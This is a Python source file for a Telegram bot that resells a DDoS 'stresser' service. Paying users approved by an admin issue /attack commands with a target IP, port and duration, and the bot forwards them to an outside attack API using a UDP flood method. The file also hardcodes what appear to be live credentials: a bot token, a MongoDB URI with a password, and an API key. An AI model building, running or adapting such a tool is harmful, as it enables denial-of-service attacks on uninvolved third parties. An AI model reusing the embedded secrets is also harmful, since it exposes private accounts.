import asyncio
import logging
import os
import requests
import threading
from datetime import datetime, timedelta, timezone
from functools import wraps
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING
from dotenv import load_dotenv

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# --- CONFIG ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev")
ADMIN_IDS = [8787952549]
API_KEY = "ak_e09b114844018935feffc"
API_URL = "https://api.battle-destroyer.shop/api/attack"

# --- DB SETUP ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client["attack_bot"]
        self.users = self.db.users
        self.users.create_index([("user_id", ASCENDING)], unique=True)

    def get_user(self, user_id): 
        return self.users.find_one({"user_id": user_id})
    
    def create_user(self, user_id, username):
        if not self.get_user(user_id):
            self.users.insert_one({
                "user_id": user_id, 
                "username": username, 
                "approved": False,
                "expires_at": None
            })

    def approve_user(self, user_id, days):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "expires_at": expiry}})
        return expiry

db = Database()

# --- FLASK FOR RAILWAY (Health Check) ---
app = Flask(__name__)
@app.route('/')
def health(): return "API Bot is Running!", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- BOT DECORATORS ---
def admin_only(func):
    @wraps(func)
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin Access Required.")
            return
        return await func(update, context)
    return wrapper

# --- COMMANDS ---
async def start(update, context):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    user = db.get_user(user_id)
    
    if user.get("approved"):
        expiry = user['expires_at'].strftime('%Y-%m-%d')
        await update.message.reply_text(f"✅ Active Subscription\nExpires: {expiry}\n\nUse: `/attack <target> <port> <time>`")
    else:
        await update.message.reply_text("❌ Your account is not approved.\nContact @Admin for access.")

@admin_only
async def approve(update, context):
    try:
        uid = int(context.args[0])
        days = int(context.args[1])
        expiry = db.approve_user(uid, days)
        await update.message.reply_text(f"✅ User {uid} approved for {days} days.\nExpiry: {expiry.date()}")
    except (IndexError, ValueError):
        await update.message.reply_text("Format: /approve <user_id> <days>")

async def attack(update, context):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user or not user.get("approved"):
        return await update.message.reply_text("❌ Access Denied.")

    if len(context.args) < 3:
        return await update.message.reply_text("Usage: `/attack <ip> <port> <time>`")

    target, port, time = context.args[0], context.args[1], context.args[2]

    # Stresser API Request
    params = {
        "api_key": API_KEY,
        "target": target,
        "port": port,
        "duration": time,
        "methods": "UDP-MIX"
    }

    try:
        # Calling the Stresser URL
        response = requests.get(API_URL, params=params, timeout=15)
        res_data = response.json()
        
        # Displaying clean output to user
        await update.message.reply_text(
            f"🚀 **Attack Initiated!**\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{time}s`\n"
            f"📡 Method: `UDP-MIX`\n"
            f"📝 Response: `{res_data}`"
        )
    except Exception as e:
        logger.error(f"API Error: {e}")
        await update.message.reply_text(f"⚠️ API Error: Connection failed.")

# --- MAIN ---
def main():
    # Start Web Server for Railway
    threading.Thread(target=run_flask, daemon=True).start()

    # Initialize Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("attack", attack))

    print("✅ API Bot is online...")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
